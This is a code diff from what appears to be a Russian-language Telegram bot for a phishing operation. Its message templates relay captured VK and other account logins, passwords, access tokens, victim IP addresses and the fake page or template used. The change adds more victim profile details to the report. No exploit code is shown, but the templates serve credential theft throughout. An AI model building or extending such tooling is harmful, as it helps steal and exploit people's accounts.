@@ -164,8 +164,8 @@ const Menu = [
     ['❓ Информация', '📊 О боте'],
 ]
 const messages = {
-    vkMessage: function (name, login, password, token, id, friends, followers, ip, fake, fake2, date, date2, length, c) {
-        return  `Ваши аккаунты ${name}☘️\n\n😻 Login: <code>${login}</code>\n🗝 Password: <code>${password}</code>\n🖇  Token: <code>${token}</code>\n\n🆔 ID:${id}\n\n🤼 Друзей: ${friends}\n👨‍👩‍👧‍👦 Подписчиков: ${followers}\n\n📍 IP: <code>${ip}</code>\n🖥 Fake: <code>${fake}</code>\n🚧 Шаблон: ${fake2}\n\n🗓 Дата: <code>${date}</code>\n🕰 Время: <code>${date2}</code>\n${emptyString}[${c+1}/${length}]`
+    vkMessage: function (name, login, password, token,first_name, last_name, id, friends, followers,online_emoji, online,gifts, ip, fake, pattern,query, date, date2, length, c) {
+        return  `Ваши аккаунты ${name}☘️\n\n😻 Login: <code>${login}</code>\n🗝 Password: <code>${password}</code>\n🖇  Token: <code>${token}</code>\n\n🚶Имя: ${first_name}\n🍌Фамилия: ${last_name}\n\n🆔 ID: <a href="https://vk.com/${id}">${id}</a>\n\n🤼 Друзей: ${friends}\n👨‍👩‍👧‍👦 Подписчиков: ${followers}\n\n${online_emoji} Статус: ${online}\n\n🎁 Подарков: ${gifts}\n\n📍 IP: <code>${ip}</code>\n🖥 Fake: <code>${fake}</code>\n🚧 Шаблон: <code>${pattern}</code>\n\n🗓 Дата: <code>${date}</code>\n🕰 Время: <code>${date2}</code>\n${emptyString}[${c+1}/${length}]`
     },
     otherMessage: function (name, login, password, ip, fake, fake2, date, date2,   length, c){
         return `Ваши аккаунты ${name}☘️\n\n😻 Login: <code>${login}</code>\n🗝 Password: <code>${password}</code>\n\n📍 IP: <code>${ip}</code>\n🖥 Fake: <code>${fake}</code>\n🚧 Шаблон: ${fake2}\n\n🗓 Дата: <code>${date}</code>\n🕰 Время: <code>${date2}</code>\n${emptyString}[${c+1}/${length}]`
